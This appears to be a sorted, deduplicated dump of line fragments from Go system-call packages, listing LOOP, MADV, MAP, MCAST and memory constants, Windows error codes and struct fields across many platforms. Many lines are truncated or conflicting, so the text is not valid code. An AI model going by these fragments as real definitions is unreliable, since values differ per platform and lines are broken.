LOCK_UN                                     = 0x8
LOCK_UN                                 = 0x8
LOCK_UN                           = 0x8
LOCK_UN                         = 0x8 // Not exist on zOS
LOCK_UN                        = 0x8
LOCK_UN                       = 0x8
LOOP_(CLR
LOOP_CLR_FD                                 = 0x4c01
LOOP_CTL_ADD                                = 0x4c80
LOOP_CTL_GET_FREE                           = 0x4c82
LOOP_CTL_REMOVE                             = 0x4c81
LOOP_GET_STATUS                             = 0x4c03
LOOP_GET_STATUS64                           = 0x4c05
LOOP_SET_BLOCK_SIZE                         = 0x4c09
LOOP_SET_CAPACITY                           = 0x4c07
LOOP_SET_DIRECT_IO                          = 0x4c08
LOOP_SET_FD                                 = 0x4c00
LOOP_SET_STATUS                             = 0x4c02
LOOP_SET_STATUS64                           = 0x4c04
LOOP_SET_STATUS_CLEARABLE_FLAGS             = 0x4
LOOP_SET_STATUS_SETTABLE_FLAGS              = 0xc
LO_(KEY
LO_FLAGS_AUTOCLEAR = 0x4
LO_FLAGS_DIRECT_IO = 0x10
LO_FLAGS_PARTSCAN  = 0x8
LO_FLAGS_READ_ONLY = 0x1
LO_KEY_SIZE                                 = 0x20
LO_NAME_SIZE                                = 0x40
LPTR                = LMEM_FIXED 
LUID) (err error) = advapi32.LookupPrivilegeValueW
LUID) (err error) {
LWTUNNEL_ENCAP_BPF        = 0x6
LWTUNNEL_ENCAP_ILA        = 0x3
LWTUNNEL_ENCAP_IOAM6      = 0x9
LWTUNNEL_ENCAP_IP         = 0x2
LWTUNNEL_ENCAP_IP6        = 0x4
LWTUNNEL_ENCAP_MAX        = 0x9
LWTUNNEL_ENCAP_MPLS       = 0x1
LWTUNNEL_ENCAP_NONE       = 0x0
LWTUNNEL_ENCAP_RPL        = 0x8
LWTUNNEL_ENCAP_SEG6       = 0x5
LWTUNNEL_ENCAP_SEG6_LOCAL = 0x7
LWTUNNEL_IP/ 
LWTUNNEL_IP6_MAX                            = 0x8
LWTUNNEL_IP_MAX                             = 0x8
LWTUNNEL_IP_OPTS_MAX                        = 0x3
LWTUNNEL_IP_OPT_ERSPAN_MAX                  = 0x4
LWTUNNEL_IP_OPT_GENEVE_MAX                  = 0x3
LWTUNNEL_IP_OPT_VXLAN_MAX                   = 0x1
Label SIDAndAttributes
Larger Work
LastAccessTime     Filetime
LastAccessTime    Filetime
LastAccessTime Filetime
LastChange      uint32
LastWriteTime      Filetime
LastWriteTime     Filetime
LastWriteTime  Filetime
Last_ack_recv  uint32
Last_ack_sent  uint32
Last_data_recv uint32
Last_data_sent uint32
Last_lun       uint16
Lastchange   Timeval
Lastchange  Timeval
Lastchange Timespec
Lastchange Timeval
Lastchange Timeval32
LazyDLL
LazyDLL {
LazyDLL) Handle() uintptr {
LazyDLL) Load() error {
LazyDLL) NewProc(name string) 
LazyDLL) mustLoad() {
LazyDLL{Name: name}
LazyProc {
LazyProc) Addr() uintptr {
LazyProc) Find() error {
LazyProc) mustFind() {
Lba_capacity   uint32
Lba_capacity_2 uint64
Ldr                    
LeaseExpires        int64
LeaseLifetime      uint32
LeaseObtained       int64
Left   int16
Len         int32
Len         uint32
Len       int32
Len       uint32
Len       uint8
Len      uint64
Len      uint8
Len     uint16
Len     uint32
Len    int32
Len    int64
Len    uint16
Len    uint32
Len    uint64
Len    uint8
Len   int32
Len   uint32
Len   uint64
Len  int
Len  uint16
Len  uint32
Len  uint64
Len int32
Len uint32
Length                uint32
Length              uint32
Length             uint32
Length           uint32
Length        uint16
Length       uint16
Length       uint32
Length       uint64
Length     int64
Length    uint16
Length   uint16
Length   uint32
Length  int64
Length  uint32
Length int64  // file length
Length uint32
Length uint64
Length: 
LessThanOrEqual
Level int32
Lflag  uint32
Lflag  uint64
Lflag uint16
Lflag uint32
Licensable
License
Lifreq) GetLifruInt() int {
Lifreq) GetLifruUint() uint {
Lifreq) SetLifruInt(d int) {
Lifreq) SetLifruUint(d uint) {
Lifreq) SetName(name string) error {
Lifreq) error {
Lifru  [336]byte
Lifru1 [4]byte
LimitFlags              uint32
Line   uint8
Line  int8
Line  uint8
Linger int32
Linger uint16
Linger) (err error) {
Link      uint32
Link      uint64
Link_state   uint8
Link_state  uint8
Link_state int32
Link_state uint64
Link_state uint8
Linkname [68]int8
Linkname [68]uint8
Lo       uint64
LoadCount        uint16
LoadOrderGroup   
LoadOrderIndex   uint16
LoaderThreads         uint32
Loads     [3]uint32
Loads     [3]uint64
LocalFree(Handle(unsafe.Pointer(al.data)))
Locale            uint32
Lock           uint32
LockDuration uint32
LockOwner    
LockablePipe {
LockablePipe) Flush() []byte {
LockablePipe{
Locked uint32
Locks     uint64
Locks    uint32
Locks    uint64
Login   [12]byte
Long string
Long: 
Long: fmt.Sprintf(
LookupAccountName(systemName 
LookupAccountSid(systemName 
LookupPrivilegeValue(systemname 
Loop:
Losigs uint32
Lost           uint32
LowDateTime  uint32
LowPart  uint32
Lowat int32
Lower uint32
LowerQualityChainCount     uint32
LowerQualityChains         
Lpid       int32
Lpid   int32
Lr   uint64
Lspare  int32
Luid       LUID
Lwm   uint16
Lwpid        int32
M7q9Fqnwd2mZr3AFqexg8YTfoM=
MADV
MADV_ACCESS_DEFAULT           = 0x6
MADV_ACCESS_LWP               = 0x7
MADV_ACCESS_MANY              = 0x8
MADV_AUTOSYNC                     = 0x7
MADV_AUTOSYNC                  = 0x7
MADV_CAN_REUSE                          = 0x9
MADV_COLD                                   = 0x14
MADV_CONTROL_END                  = 0xb
MADV_CONTROL_START                = 0xa
MADV_CORE                         = 0x9
MADV_CORE                      = 0x9
MADV_DODUMP                                 = 0x11
MADV_DODUMP                     = 14 // for Linux compatibility -- no zos semantics
MADV_DOFORK                                 = 0xb
MADV_DOFORK                     = 6  // for Linux compatibility -- no zos semantics
MADV_DONTDUMP                               = 0x10
MADV_DONTDUMP                   = 13 // for Linux compatibility -- no zos semantics
MADV_DONTFORK                               = 0xa
MADV_DONTFORK                   = 5  // for Linux compatibility -- no zos semantics
MADV_DONTNEED                               = 0x4
MADV_DONTNEED                           = 0x4
MADV_DONTNEED                     = 0x4
MADV_DONTNEED                  = 0x4
MADV_DONTNEED                 = 0x4
MADV_FREE                                   = 0x8
MADV_FREE                               = 0x5
MADV_FREE                         = 0x5
MADV_FREE                         = 0x6
MADV_FREE                       = 15 // for Linux compatibility -- no zos semantics
MADV_FREE                      = 0x5
MADV_FREE                     = 0x5
MADV_FREE_REUSABLE                      = 0x7
MADV_FREE_REUSE                         = 0x8
MADV_HUGEPAGE                               = 0xe
MADV_HUGEPAGE                   = 11 // for Linux compatibility -- no zos semantics
MADV_HWPOISON                               = 0x64
MADV_HWPOISON                   = 7  // for Linux compatibility -- no zos semantics
MADV_INVAL                        = 0xa
MADV_KEEPONFORK                             = 0x13
MADV_KEEPONFORK                 = 17 // for Linux compatibility -- no zos semantics
MADV_MERGEABLE                              = 0xc
MADV_MERGEABLE                  = 8  // for Linux compatibility -- no zos semantics
MADV_NOCORE                       = 0x8
MADV_NOCORE                    = 0x8
MADV_NOHUGEPAGE                             = 0xf
MADV_NOHUGEPAGE                 = 12 // for Linux compatibility -- no zos semantics
MADV_NORMAL                                 = 0x0
MADV_NORMAL                             = 0x0
MADV_NORMAL                       = 0x0
MADV_NORMAL                     = 0  // for Linux compatibility -- no zos semantics
MADV_NORMAL                    = 0x0
MADV_NORMAL                   = 0x0
MADV_NOSYNC                       = 0x6
MADV_NOSYNC                    = 0x6
MADV_PAGEOUT                                = 0x15
MADV_PAGEOUT                            = 0xa
MADV_POPULATE_READ                          = 0x16
MADV_POPULATE_WRITE                         = 0x17
MADV_PROTECT                   = 0xa
MADV_PURGE                    = 0x9
MADV_RANDOM                                 = 0x1
MADV_RANDOM                             = 0x1
MADV_RANDOM                       = 0x1
MADV_RANDOM                     = 1  // for Linux compatibility -- no zos semantics
MADV_RANDOM                    = 0x1
MADV_RANDOM                   = 0x1
MADV_REMOVE                                 = 0x9
MADV_REMOVE                     = 4  // for Linux compatibility -- no zos semantics
MADV_SEQUENTIAL                             = 0x2
MADV_SEQUENTIAL                         = 0x2
MADV_SEQUENTIAL                   = 0x2
MADV_SEQUENTIAL                 = 2  // for Linux compatibility -- no zos semantics
MADV_SEQUENTIAL                = 0x2
MADV_SEQUENTIAL               = 0x2
MADV_SETMAP                       = 0xb
MADV_SOFT_OFFLINE               = 10 // for Linux compatibility -- no zos semantics
MADV_SPACEAVAIL                   = 0x5
MADV_SPACEAVAIL               = 0x5
MADV_UNMERGEABLE                            = 0xd
MADV_UNMERGEABLE                = 9  // for Linux compatibility -- no zos semantics
MADV_WILLNEED                               = 0x3
MADV_WILLNEED                           = 0x3
MADV_WILLNEED                     = 0x3
MADV_WILLNEED                   = 3  // for Linux compatibility -- no zos semantics
MADV_WILLNEED                  = 0x3
MADV_WILLNEED                 = 0x3
MADV_WIPEONFORK                             = 0x12
MADV_WIPEONFORK                 = 16 // for Linux compatibility -- no zos semantics
MADV_ZERO_WIRED_PAGES                   = 0x6
MAFTER  = 0x0002
MAP_32BIT                               = 0x8000
MAP_32BIT                        = 0x40
MAP_32BIT                      = 0x80000
MAP_32BIT                     = 0x80
MAP_ALIGN                     = 0x200
MAP_ALIGNED_SUPER              = 0x1000000
MAP_ALIGNMENT_16MB                = 0x18000000
MAP_ALIGNMENT_1TB                 = 0x28000000
MAP_ALIGNMENT_256TB               = 0x30000000
MAP_ALIGNMENT_4GB                 = 0x20000000
MAP_ALIGNMENT_64KB                = 0x10000000
MAP_ALIGNMENT_64PB                = 0x38000000
MAP_ALIGNMENT_MASK                = -0x1000000
MAP_ALIGNMENT_MASK             = -0x1000000
MAP_ALIGNMENT_SHIFT               = 0x18
MAP_ALIGNMENT_SHIFT            = 0x18
MAP_ANON                                = 0x1000
MAP_ANON                          = 0x1000
MAP_ANON                         = 0x20
MAP_ANON                         = 0x800
MAP_ANON                       = 0x1000
MAP_ANON                      = 0x10
MAP_ANON                      = 0x100
MAP_ANONYMOUS                           = 0x1000
MAP_ANONYMOUS                     = 0x1000
MAP_ANONYMOUS                    = 0x20
MAP_ANONYMOUS                    = 0x800
MAP_ANONYMOUS                  = 0x1000
MAP_ANONYMOUS                 = 0x10
MAP_ANONYMOUS                 = 0x100
MAP_CONCEAL                       = 0x8000
MAP_COPY                                = 0x2
MAP_COPY                          = 0x2
MAP_COPY                       = 0x2
MAP_DENYWRITE                    = 0x2000
MAP_DENYWRITE                    = 0x800
MAP_EXCL                       = 0x4000
MAP_EXECUTABLE                   = 0x1000
MAP_EXECUTABLE                   = 0x4000
MAP_FILE                                    = 0x0
MAP_FILE                                = 0x0
MAP_FILE                          = 0x0
MAP_FILE                       = 0x0
MAP_FILE                      = 0x0
MAP_FIXED                                   = 0x10
MAP_FIXED                               = 0x10
MAP_FIXED                         = 0x10
MAP_FIXED                       = 0x4 // place exactly
MAP_FIXED                      = 0x10
MAP_FIXED                     = 0x10
MAP_FIXED                     = 0x100
MAP_FIXED_NOREPLACE                         = 0x100000
MAP_FLAGMASK                      = 0xfff7
MAP_GROWSDOWN                    = 0x100
MAP_GROWSDOWN                    = 0x1000
MAP_GROWSDOWN                    = 0x200
MAP_GUARD                      = 0x2000
MAP_HASSEMAPHORE                        = 0x200
MAP_HASSEMAPHORE                  = 0x0
MAP_HASSEMAPHORE                  = 0x200
MAP_HASSEMAPHORE               = 0x200
MAP_HUGETLB                      = 0x40000
MAP_HUGETLB                      = 0x80000
MAP_HUGE_MASK                               = 0x3f
MAP_HUGE_SHIFT                              = 0x1a
MAP_INHERIT                       = 0x0
MAP_INHERIT                       = 0x80
MAP_INHERIT_COPY                  = 0x1
MAP_INHERIT_DEFAULT               = 0x1
MAP_INHERIT_DONATE_COPY           = 0x3
MAP_INHERIT_NONE                  = 0x2
MAP_INHERIT_SHARE                 = 0x0
MAP_INHERIT_ZERO                  = 0x3
MAP_INITDATA                  = 0x800
MAP_JIT                                 = 0x800
MAP_LOCKED                       = 0x100
MAP_LOCKED                       = 0x2000
MAP_LOCKED                       = 0x80
MAP_LOCKED                       = 0x8000
MAP_NOCACHE                             = 0x400
MAP_NOCORE                        = 0x20000
MAP_NOCORE                     = 0x20000
MAP_NOEXTEND                            = 0x100
MAP_NOEXTEND                      = 0x0
MAP_NOEXTEND                      = 0x100
MAP_NONBLOCK                     = 0x10000
MAP_NONBLOCK                     = 0x20000
MAP_NORESERVE                           = 0x40
MAP_NORESERVE                     = 0x0
MAP_NORESERVE                     = 0x40
MAP_NORESERVE                    = 0x40
MAP_NORESERVE                    = 0x400
MAP_NORESERVE                    = 0x4000
MAP_NORESERVE                 = 0x40
MAP_NORESERVE   = 0x40
MAP_NOSYNC                        = 0x800
MAP_NOSYNC                     = 0x800
MAP_POPULATE                     = 0x10000
MAP_POPULATE                     = 0x8000
MAP_PREFAULT_READ              = 0x40000
MAP_PRIVATE                                 = 0x2
MAP_PRIVATE                             = 0x2
MAP_PRIVATE                       = 0x2
MAP_PRIVATE                     = 0x1 // changes are private
MAP_PRIVATE                    = 0x2
MAP_PRIVATE                   = 0x2
MAP_RENAME                              = 0x20
MAP_RENAME                        = 0x0
MAP_RENAME                        = 0x20
MAP_RENAME                       = 0x20
MAP_RENAME                       = 0x800
MAP_RENAME                    = 0x20
MAP_RENAME      = 0x20
MAP_RESERVED0020               = 0x20
MAP_RESERVED0040               = 0x40
MAP_RESERVED0080                        = 0x80
MAP_RESERVED0080               = 0x80
MAP_RESERVED0100               = 0x100
MAP_RESILIENT_CODESIGN                  = 0x2000
MAP_RESILIENT_MEDIA                     = 0x4000
MAP_SHARED                                  = 0x1
MAP_SHARED                              = 0x1
MAP_SHARED                        = 0x1
MAP_SHARED                      = 0x2 // changes are shared
MAP_SHARED                     = 0x1
MAP_SHARED                    = 0x1
MAP_SHARED_VALIDATE                         = 0x3
MAP_SIZEALIGN                     = 0x40000
MAP_STACK                         = 0x2000
MAP_STACK                         = 0x400
MAP_STACK                         = 0x4000
MAP_STACK                        = 0x20000
MAP_STACK                        = 0x40000
MAP_STACK                      = 0x400
MAP_SYNC                         = 0x80000
MAP_TEXT                      = 0x400
MAP_TRANSLATED_ALLOW_EXECUTE            = 0x20000
MAP_TRYFIXED                      = 0x0
MAP_TRYFIXED                      = 0x10000
MAP_TRYFIXED                      = 0x400
MAP_TYPE                                    = 0xf
MAP_TYPE                      = 0xf
MAP_TYPE                      = 0xf0
MAP_UNIX03                              = 0x40000
MAP_VARIABLE                  = 0x0
MAP_VPAGETABLE                    = 0x2000
MAP_WIRED                         = 0x800
MARSHAL_E_FIRST                                                           syscall.Errno = 0x80040120
MARSHAL_E_LAST                                                            syscall.Errno = 0x8004012F
MARSHAL_S_FIRST                                                           syscall.Errno = 0x00040120
MARSHAL_S_LAST                                                            syscall.Errno = 0x0004012F
MAX))/ {next}
MAXBEL
MAXIMUM_ALLOWED          = 0x02000000
MAXIMUM_REPARSE_DATA_BUFFER_SIZE = 16 
MAXIMUM_RESERVED_MANIFEST_RESOURCE_ID              ResourceID = 16 // inclusive
MAXNAME
MAX_CLASS_NAME_LEN  = 32
MAX_COMPUTERNAME_LENGTH = 15
MAX_CONFIG_VALUE    = 9999
MAX_DEVICE_ID_LEN   = 200
MAX_DEVNODE_ID_LEN  = MAX_DEVICE_ID_LEN
MAX_DEVPROP_TYPE    DEVPROPTYPE = 0x00000019
MAX_DEVPROP_TYPEMOD DEVPROPTYPE = 0x00002000
MAX_GUID_STRING_LEN = 39 // 38 chars 
MAX_INF_STRING_LENGTH       = 4096 // Actual maximum size of an INF string (including string substitutions).
MAX_INSTANCE_VALUE  = 9999
MAX_INSTRUCTION_LEN         = 256
MAX_LABEL_LEN               = 30
MAX_LONG_PATH = 32768
MAX_MODULE_NAME32 = 255
MAX_PATH      = 260
MAX_PROFILE_LEN     = 80
MAX_PROTOCOL_CHAIN = 7
MAX_SERVICE_NAME_LEN        = 256
MAX_SUBTITLE_LEN            = 256
MAX_TITLE_LEN               = 60
MBEFORE = 0x0001
MB_ABORTRETRYIGNORE     = 0x00000002
MB_APPLMODAL            = 0x00000000
MB_CANCELTRYCONTINUE    = 0x00000006
MB_DEFAULT_DESKTOP_ONLY = 0x00020000
MB_DEFBUTTON1           = 0x00000000
MB_DEFBUTTON2           = 0x00000100
MB_DEFBUTTON3           = 0x00000200
MB_DEFBUTTON4           = 0x00000300
MB_HELP                 = 0x00004000
MB_ICONASTERISK         = 0x00000040
MB_ICONERROR            = MB_ICONHAND
MB_ICONEXCLAMATION      = 0x00000030
MB_ICONHAND             = 0x00000010
MB_ICONINFORMATION      = MB_ICONASTERISK
MB_ICONQUESTION         = 0x00000020
MB_ICONSTOP             = MB_ICONHAND
MB_ICONWARNING          = MB_ICONEXCLAMATION
MB_NOFOCUS              = 0x00008000
MB_OK                   = 0x00000000
MB_OKCANCEL             = 0x00000001
MB_RETRYCANCEL          = 0x00000005
MB_RIGHT                = 0x00080000
MB_RTLREADING           = 0x00100000
MB_SERVICE_NOTIFICATION = 0x00200000
MB_SETFOREGROUND        = 0x00010000
MB_SYSTEMMODAL          = 0x00001000
MB_TASKMODAL            = 0x00002000
MB_TOPMOST              = 0x00040000
MB_USERICON             = 0x00000080
MB_YESNO                = 0x00000004
MB_YESNOCANCEL          = 0x00000003
MCACHE  = 0x0010
MCAST
MCAST_BLOCK_SOURCE                          = 0x2b
MCAST_BLOCK_SOURCE                      = 0x54
MCAST_BLOCK_SOURCE              = 44
MCAST_BLOCK_SOURCE             = 0x54
MCAST_BLOCK_SOURCE            = 0x2b
MCAST_BLOCK_SOURCE            = 0x40
MCAST_EXCLUDE                               = 0x0
MCAST_EXCLUDE                           = 0x2
MCAST_EXCLUDE                  = 0x2
MCAST_EXCLUDE                 = 0x2
MCAST_INCLUDE                               = 0x1
MCAST_INCLUDE                           = 0x1
MCAST_INCLUDE                  = 0x1
MCAST_INCLUDE                 = 0x1
MCAST_JOIN_GROUP                            = 0x2a
MCAST_JOIN_GROUP                        = 0x50
MCAST_JOIN_GROUP                = 40
MCAST_JOIN_GROUP               = 0x50
MCAST_JOIN_GROUP              = 0x29
MCAST_JOIN_GROUP              = 0x3e
MCAST_JOIN_SOURCE_GROUP                     = 0x2e
MCAST_JOIN_SOURCE_GROUP                 = 0x52
MCAST_JOIN_SOURCE_GROUP         = 42
MCAST_JOIN_SOURCE_GROUP        = 0x52
MCAST_JOIN_SOURCE_GROUP       = 0x2d
MCAST_JOIN_SOURCE_GROUP       = 0x42
MCAST_LEAVE_GROUP                           = 0x2d
MCAST_LEAVE_GROUP                       = 0x51
MCAST_LEAVE_GROUP               = 41
MCAST_LEAVE_GROUP              = 0x51
MCAST_LEAVE_GROUP             = 0x2a
MCAST_LEAVE_GROUP             = 0x3f
MCAST_LEAVE_SOURCE_GROUP                    = 0x2f
MCAST_LEAVE_SOURCE_GROUP                = 0x53
MCAST_LEAVE_SOURCE_GROUP        = 43
MCAST_LEAVE_SOURCE_GROUP       = 0x53
MCAST_LEAVE_SOURCE_GROUP      = 0x2e
MCAST_LEAVE_SOURCE_GROUP      = 0x43
MCAST_MSFILTER                              = 0x30
MCAST_SOURCE_FILTER           = 0x49
MCAST_UNBLOCK_SOURCE                        = 0x2c
MCAST_UNBLOCK_SOURCE                    = 0x55
MCAST_UNBLOCK_SOURCE            = 45
MCAST_UNBLOCK_SOURCE           = 0x55
MCAST_UNBLOCK_SOURCE          = 0x2c
MCAST_UNBLOCK_SOURCE          = 0x41
MCAST_UNDEFINED                         = 0x0
MCAST_UNDEFINED                = 0x0
MCL_CURRENT                             = 0x1
MCL_CURRENT                       = 0x1
MCL_CURRENT                      = 0x1
MCL_CURRENT                      = 0x2000
MCL_CURRENT                     = 1  // for Linux compatibility -- no zos semantics
MCL_CURRENT                    = 0x1
MCL_CURRENT                   = 0x1
MCL_CURRENT                   = 0x100
MCL_FUTURE                              = 0x2
MCL_FUTURE                        = 0x2
MCL_FUTURE                       = 0x2
MCL_FUTURE                       = 0x4000
MCL_FUTURE                      = 2  // for Linux compatibility -- no zos semantics
MCL_FUTURE                     = 0x2
MCL_FUTURE                    = 0x2
MCL_FUTURE                    = 0x200
MCL_ONFAULT                      = 0x4
MCL_ONFAULT                      = 0x8000
MCL_ONFAULT                     = 3  // for Linux compatibility -- no zos semantics
MCREATE = 0x0004
MEM/ 
MEMERASE                         = 0x40084d02
MEMERASE                         = 0x80084d02
MEMERASE64                       = 0x40104d14
MEMERASE64                       = 0x80104d14
MEMGETBADBLOCK                   = 0x40084d0b
MEMGETBADBLOCK                   = 0x80084d0b
MEMGETINFO                       = 0x40204d01
MEMGETINFO                       = 0x80204d01
MEMGETOOBSEL                     = 0x40c84d0a
MEMGETOOBSEL                     = 0x80c84d0a
MEMGETREGIONCOUNT                = 0x40044d07
MEMGETREGIONCOUNT                = 0x80044d07
MEMGETREGIONINFO                            = 0xc0104d08
MEMISLOCKED                      = 0x40084d17
MEMISLOCKED                      = 0x80084d17
MEMLOCK
MEMLOCK                          = 0x40084d05
MEMLOCK                          = 0x80084d05
MEMREADOOB                       = 0xc00c4d04
MEMREADOOB                       = 0xc0104d04
MEMREADOOB64                                = 0xc0184d16
MEMSETBADBLOCK                   = 0x40084d0c
MEMSETBADBLOCK                   = 0x80084d0c
MEMUNLOCK                        = 0x40084d06
MEMUNLOCK                        = 0x80084d06
MEMWRITE                                    = 0xc0304d18
MEMWRITEOOB                      = 0xc00c4d03
MEMWRITEOOB                      = 0xc0104d03
MEMWRITEOOB64                               = 0xc0184d15
MEM_COMMIT      = 0x00001000
MEM_DECOMMIT    = 0x00004000
MEM_E_INVALID_LINK                                                        Handle        = 0x80080010
MEM_E_INVALID_ROOT                                                        Handle        = 0x80080009
MEM_E_INVALID_SIZE                                                        Handle        = 0x80080011
MEM_LARGE_PAGES = 0x20000000
MEM_PHYSICAL    = 0x00400000
MEM_RELEASE     = 0x00008000
MEM_RESERVE     = 0x00002000
MEM_RESET       = 0x00080000
MEM_RESET_UNDO  = 0x01000000
MEM_TOP_DOWN    = 0x00100000
MEM_WRITE_WATCH = 0x00200000
MFD_ALLOW_SEALING                           = 0x2
MFD_CLOEXEC                                 = 0x1
MFD_HUGETLB                                 = 0x4
MFD_HUGE_16GB                               = -0x78000000
MFD_HUGE_16MB                               = 0x60000000
MFD_HUGE_1GB                                = 0x78000000
MFD_HUGE_1MB                                = 0x50000000
MFD_HUGE_256MB                              = 0x70000000
MFD_HUGE_2GB                                = 0x7c000000
MFD_HUGE_2MB                                = 0x54000000
MFD_HUGE_32MB                               = 0x64000000
MFD_HUGE_512KB                              = 0x4c000000
MFD_HUGE_512MB                              = 0x74000000
MFD_HUGE_64KB                               = 0x40000000
MFD_HUGE_8MB                                = 0x5c000000
MFD_HUGE_MASK                               = 0x3f
MFD_HUGE_SHIFT                              = 0x1a
MILAVERR_INSUFFICIENTVIDEORESOURCES                                       Handle        = 0x88980508
MILAVERR_INVALIDWMPVERSION                                                Handle        = 0x88980507
MILAVERR_MEDIAPLAYERCLOSED                                                Handle        = 0x8898050D
MILAVERR_MODULENOTLOADED                                                  Handle        = 0x88980505
MILAVERR_NOCLOCK                                                          Handle        = 0x88980500
MILAVERR_NOMEDIATYPE                                                      Handle        = 0x88980501
MILAVERR_NOREADYFRAMES                                                    Handle        = 0x88980504
MILAVERR_NOVIDEOMIXER                                                     Handle        = 0x88980502
MILAVERR_NOVIDEOPRESENTER                                                 Handle        = 0x88980503
MILAVERR_REQUESTEDTEXTURETOOBIG                                           Handle        = 0x8898050A
MILAVERR_SEEKFAILED                                                       Handle        = 0x8898050B
MILAVERR_UNEXPECTEDWMPFAILURE                                             Handle        = 0x8898050C
MILAVERR_UNKNOWNHARDWAREERROR                                             Handle        = 0x8898050E
MILAVERR_VIDEOACCELERATIONNOTAVAILABLE                                    Handle        = 0x88980509
MILAVERR_WMPFACTORYNOTREGISTERED                                          Handle        = 0x88980506
MILEFFECTSERR_ALREADYATTACHEDTOLISTENER                                   Handle        = 0x88980618
MILEFFECTSERR_CONNECTORNOTASSOCIATEDWITHEFFECT                            Handle        = 0x88980612
MILEFFECTSERR_CONNECTORNOTCONNECTED                                       Handle        = 0x88980611
MILEFFECTSERR_CYCLEDETECTED                                               Handle        = 0x88980614
MILEFFECTSERR_EFFECTALREADYINAGRAPH                                       Handle        = 0x88980616
MILEFFECTSERR_EFFECTHASNOCHILDREN                                         Handle        = 0x88980617
MILEFFECTSERR_EFFECTINMORETHANONEGRAPH                                    Handle        = 0x88980615
MILEFFECTSERR_EFFECTNOTPARTOFGROUP                                        Handle        = 0x8898060F
MILEFFECTSERR_EMPTYBOUNDS                                                 Handle        = 0x8898061A
MILEFFECTSERR_NOINPUTSOURCEATTACHED                                       Handle        = 0x88980610
MILEFFECTSERR_NOTAFFINETRANSFORM                                          Handle        = 0x88980619
MILEFFECTSERR_OUTPUTSIZETOOLARGE                                          Handle        = 0x8898061B
MILEFFECTSERR_RESERVED                                                    Handle        = 0x88980613
MILEFFECTSERR_UNKNOWNPROPERTY                                             Handle        = 0x8898060E
MILERR_ADAPTER_NOT_FOUND                                                  Handle        = 0x8898009E
MILERR_ALREADYLOCKED                                                      Handle        = 0x88980086
MILERR_ALREADY_INITIALIZED                                                Handle        = 0x8898008F
MILERR_BADNUMBER                                                          Handle        = 0x8898000A
MILERR_COLORSPACE_NOT_SUPPORTED                                           Handle        = 0x8898009F
MILERR_DEVICECANNOTRENDERTEXT                                             Handle        = 0x88980088
MILERR_DISPLAYFORMATNOTSUPPORTED                                          Handle        = 0x88980084
MILERR_DISPLAYID_ACCESS_DENIED                                            Handle        = 0x889800A1
MILERR_DISPLAYSTATEINVALID                                                Handle        = 0x88980006
MILERR_DXGI_ENUMERATION_OUT_OF_SYNC                                       Handle        = 0x8898009D
MILERR_GENERIC_IGNORE                                                     Handle        = 0x8898008B
MILERR_GLYPHBITMAPMISSED                                                  Handle        = 0x88980089
MILERR_INSUFFICIENTBUFFER                                                 Handle        = 0x88980002
MILERR_INTERNALERROR                                                      Handle        = 0x88980080
MILERR_INVALIDCALL                                                        Handle        = 0x88980085
MILERR_MALFORMEDGLYPHCACHE                                                Handle        = 0x8898008A
MILERR_MALFORMED_GUIDELINE_DATA                                           Handle        = 0x8898008C
MILERR_MAX_TEXTURE_SIZE_EXCEEDED                                          Handle        = 0x8898009A
MILERR_MISMATCHED_SIZE                                                    Handle        = 0x88980090
MILERR_MROW_READLOCK_FAILED                                               Handle        = 0x88980097
MILERR_MROW_UPDATE_FAILED                                                 Handle        = 0x88980098
MILERR_NEED_RECREATE_AND_PRESENT                                          Handle        = 0x8898008E
MILERR_NONINVERTIBLEMATRIX                                                Handle        = 0x88980007
MILERR_NOTLOCKED                                                          Handle        = 0x88980087
MILERR_NOT_QUEUING_PRESENTS                                               Handle        = 0x88980094
MILERR_NO_HARDWARE_DEVICE                                                 Handle        = 0x8898008D
MILERR_NO_REDIRECTION_SURFACE_AVAILABLE                                   Handle        = 0x88980091
MILERR_NO_REDIRECTION_SURFACE_RETRY_LATER                                 Handle        = 0x88980095
MILERR_OBJECTBUSY                                                         Handle        = 0x88980001
MILERR_PREFILTER_NOT_SUPPORTED                                            Handle        = 0x889800A0
MILERR_QPC_TIME_WENT_BACKWARD                                             Handle        = 0x8898009B
MILERR_QUEUED_PRESENT_NOT_SUPPORTED                                       Handle        = 0x88980093
MILERR_REMOTING_NOT_SUPPORTED                                             Handle        = 0x88980092
MILERR_SCANNER_FAILED                                                     Handle        = 0x88980004
MILERR_SCREENACCESSDENIED                                                 Handle        = 0x88980005
MILERR_SHADER_COMPILE_FAILED                                              Handle        = 0x88980099
MILERR_TERMINATED                                                         Handle        = 0x88980009
MILERR_TOOMANYSHADERELEMNTS                                               Handle        = 0x88980096
MILERR_WIN32ERROR                                                         Handle        = 0x88980003
MILERR_ZEROVECTOR                                                         Handle        = 0x88980008
MINIMUM_RESERVED_MANIFEST_RESOURCE_ID              ResourceID = 1  // inclusive
MINIX2_SUPER_MAGIC                          = 0x2468
MINIX2_SUPER_MAGIC2                         = 0x2478
MINIX3_SUPER_MAGIC                          = 0x4d5a
MINIX_SUPER_MAGIC                           = 0x137f
MINIX_SUPER_MAGIC2                          = 0x138f
MIT License
MK_E_CANTOPENFILE                                                         Handle        = 0x800401EA
MK_E_CONNECTMANUALLY                                                      Handle        = 0x800401E0
MK_E_ENUMERATION_FAILED                                                   Handle        = 0x800401EF
MK_E_EXCEEDEDDEADLINE                                                     Handle        = 0x800401E1
MK_E_FIRST                                                                syscall.Errno = 0x800401E0
MK_E_INTERMEDIATEINTERFACENOTSUPPORTED                                    Handle        = 0x800401E7
MK_E_INVALIDEXTENSION                                                     Handle        = 0x800401E6
MK_E_LAST                                                                 syscall.Errno = 0x800401EF
MK_E_MUSTBOTHERUSER                                                       Handle        = 0x800401EB
MK_E_NEEDGENERIC                                                          Handle        = 0x800401E2
MK_E_NOINVERSE                                                            Handle        = 0x800401EC
MK_E_NOOBJECT                                                             Handle        = 0x800401E5
MK_E_NOPREFIX                                                             Handle        = 0x800401EE
MK_E_NOSTORAGE                                                            Handle        = 0x800401ED
MK_E_NOTBINDABLE                                                          Handle        = 0x800401E8
MK_E_NOTBOUND                                                             Handle        = 0x800401E9
MK_E_NO_NORMALIZED                                                        Handle        = 0x80080007
MK_E_SYNTAX                                                               Handle        = 0x800401E4
MK_E_UNAVAILABLE                                                          Handle        = 0x800401E3
MK_S_FIRST                                                                syscall.Errno = 0x000401E0
MK_S_HIM                                                                  Handle        = 0x000401E5
MK_S_LAST                                                                 syscall.Errno = 0x000401EF
MK_S_ME                                                                   Handle        = 0x000401E4
MK_S_MONIKERALREADYREGISTERED                                             Handle        = 0x000401E7
MK_S_REDUCED_TO_SELF                                                      Handle        = 0x000401E2
